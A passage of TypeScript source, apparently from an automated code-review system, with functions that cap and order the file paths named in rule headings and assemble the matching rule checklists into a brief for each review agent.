    /(?:^|\/)(?:target|build)\/(?:generated-sources|generated-test-sources|generated)\//i.test(
      p,
    )
  );
}

/**
 * The triggering paths named in a rule's heading — capped. A workflow rule
 * matches one or two files; a Java rule matches every source file in a large
 * PR, and listing hundreds of paths in the heading of every agent's brief is
 * ~11 KB of a list the agent already has from its file table. Name the first
 * few and a count; the checklist, not the path list, is what the heading is
 * for.
 */
function describePaths(rule: PathRule, which: readonly string[]): string {
  const CAP = 10;
  // Paths a rule's own checklist scopes out (the JAVA rule's test, generated,
  // and info-only sources) go after the paths the checklist is written for, so
  // a PR that is mostly such files must not fill the capped heading with them.
  // A rule without such a scoping keeps diff order — the lane rule's test
  // scripts are its primary subject, not noise to demote.
  const demoted = rule.outOfScope ?? (() => false);
  const prod = which.filter((p) => !demoted(p));
  const rest = which.filter((p) => demoted(p));
  const ordered = [...prod, ...rest];
  if (ordered.length <= CAP) {
    return ordered.join(', ');
  }
  return `${ordered.slice(0, CAP).join(', ')}, …and ${ordered.length - CAP} more`;
}

/**
 * The checklists that govern `paths`, as a brief section — or `''` when none do.
 *
 * Scoped to what the agent can actually see. An agent whose territory holds no
 * workflow is not handed the workflow checklist: a rule that fires on every review
 * is a rule that gets skimmed, and this one has to be read.
 */
export function pathRulesFor(paths: readonly string[]): string {
  const hit = PATH_RULES.filter((r) => paths.some((p) => r.matches(p)));
  if (hit.length === 0) return '';
  const parts = ['## Rules for the files in front of you', ''];
  for (const r of hit) {
    const which = paths.filter((p) => r.matches(p));
    parts.push(
      `### ${r.title} — ${describePaths(r, which)}`,
      '',
      r.checklist,
      '',
    );
  }
  return parts.join('\n').trimEnd();
}
